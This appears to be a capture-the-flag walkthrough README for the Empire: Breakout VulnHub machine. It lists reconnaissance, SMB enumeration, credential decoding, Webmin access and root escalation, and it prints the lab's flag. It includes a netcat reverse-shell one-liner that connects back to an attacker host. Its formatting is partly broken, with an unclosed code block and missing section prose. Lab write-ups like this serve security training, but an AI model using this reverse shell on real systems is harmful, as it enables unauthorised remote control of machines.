# EMPIRE: BREAKOUT

> A complete penetration testing walkthrough for the Empire: Breakout VulnHub machine, detailing exploitation from reconnaissance to root flag capture.

[![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kali-linux&logoColor=white)](https://www.kali.org/)
[![VulnHub](https://img.shields.io/badge/VulnHub-FFFFFF?style=for-the-badge&logo=vulnhub&logoColor=black)](https://www.vulnhub.com/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

---

## 📋 Table of Contents
- [Introduction](#introduction)
- [Objective](#objective)
- [Lab Environment](#lab-environment)
- [Methodology Overview](#methodology-overview)
- [Phase 1: Network Discovery](#phase-1-network-discovery)
- [Phase 2: Scanning & Service Enumeration](#phase-2-scanning--service-enumeration)
- [Phase 3: Service Enumeration](#phase-3-service-enumeration)
  - [SMB Enumeration](#31-smb-enumeration)
  - [Web Enumeration](#32-web-enumeration)
- [Phase 4: Credential Decoding](#phase-4-credential-decoding)
- [Phase 5: Initial Exploitation (Webmin Access)](#phase-5-initial-exploitation-webmin-access)
- [Phase 6: Reverse Shell Stabilization](#phase-6-reverse-shell-stabilization)
- [Phase 7: Privilege Escalation](#phase-7-privilege-escalation)
- [Phase 8: Root Flag Capture](#phase-8-root-flag-capture)
- [Key Findings](#key-findings)
- [Key Learnings](#key-learnings)
- [Tools Used](#tools-used)
- [Author](#author)
- [License](#license)

---

## 📖 Introduction

**Empire: Breakout** is a purposely vulnerable Debian-based machine designed for cybersecurity training and penetration testing practice. This repository documents a structured, professional methodology used to identify, exploit, and escalate privileges on the system, ultimately gaining root access.

The project demonstrates how seemingly minor misconfigurations—when chained together—can lead to complete system compromise. Key vulnerabilities identified include:
- Information disclosure in HTML source code
- Weak encoding (Brainfuck) used as "security"
- Exposed SMB services allowing user enumeration
- Backup files containing sensitive credentials
- Password reuse enabling privilege escalation

---

## 🎯 Objective

The primary goals of this penetration test were to:

| # | Objective | Status |
|---|-----------|--------|
| 1 | Discover live hosts in the network | ✅ |
| 2 | Identify open ports and running services | ✅ |
| 3 | Perform SMB enumeration to identify valid usernames | ✅ |
| 4 | Analyze web applications and inspect hidden source code | ✅ |
| 5 | Decode encrypted credentials | ✅ |
| 6 | Gain initial access to the system | ✅ |
| 7 | Perform privilege escalation to root | ✅ |
| 8 | Retrieve the root flag as proof of successful exploitation | ✅ |

---

## ⚙️ Lab Environment

| Component | Details |
|-----------|---------|
| **Attacker Machine** | Kali Linux |
| **Target Machine** | Empire: Breakout (VulnHub) |
| **Target IP** | 192.168.237.6 |
| **Virtualization** | VirtualBox |
| **Network Type** | Host-Only / NAT |
| **Tools Used** | Nmap, smbclient, enum4linux, Netcat, Python, Webmin |

---

## 🗺️ Methodology Overview

The attack followed a structured, industry-standard penetration testing methodology:




---

## Phase 1: Network Discovery

The first step was identifying the target machine on the local network using a ping scan.

### Command Used
```bash
nmap -sn 192.168.237.1/24


Nmap scan report for 192.168.237.6
Host is up (0.00052s latency).
MAC Address: 08:00:27:XX:XX:XX (Oracle VirtualBox)

nmap -sV -sC -O -p- 192.168.237.6

smbclient -L //192.168.237.6 -N

enum4linux -a 192.168.237.6

<!--
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>+++++++++++++.>>++++++++++.-.------------.--
--------.++++++.+.>>-----------.+++++++++++++.>>------------------.++++++.--
----.+++..------
-->

# Using exploits/brainfuck-decoder.py
python3 exploits/brainfuck-decoder.py "++++++++++[>+>+++>+++++++>++++++++++<<<<-]..."


URL: https://192.168.237.6:10000
Username: cyber
Password: [decoded password]

nc -lvnp 4242

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [Kali-IP] 4242 >/tmp/f

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Background with Ctrl+Z, then:
stty raw -echo; fg
# Press Enter twice

ls -la /var/backups/

cd /var/backups
tar -xf backup.tar
cat .old_pass.bak

su root
Password: [old password from backup]
cat /root/root.txt

3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}



# Network discovery
nmap -sn 192.168.237.1/24

# Full port scan
nmap -sV -sC -O -p- 192.168.237.6

# SMB enumeration
smbclient -L //192.168.237.6 -N
enum4linux -a 192.168.237.6

# Webmin access
# URL: https://192.168.237.6:10000

# Reverse shell listener
nc -lvnp 4242

# Shell stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Privilege escalation
su root
cat /root/root.txt
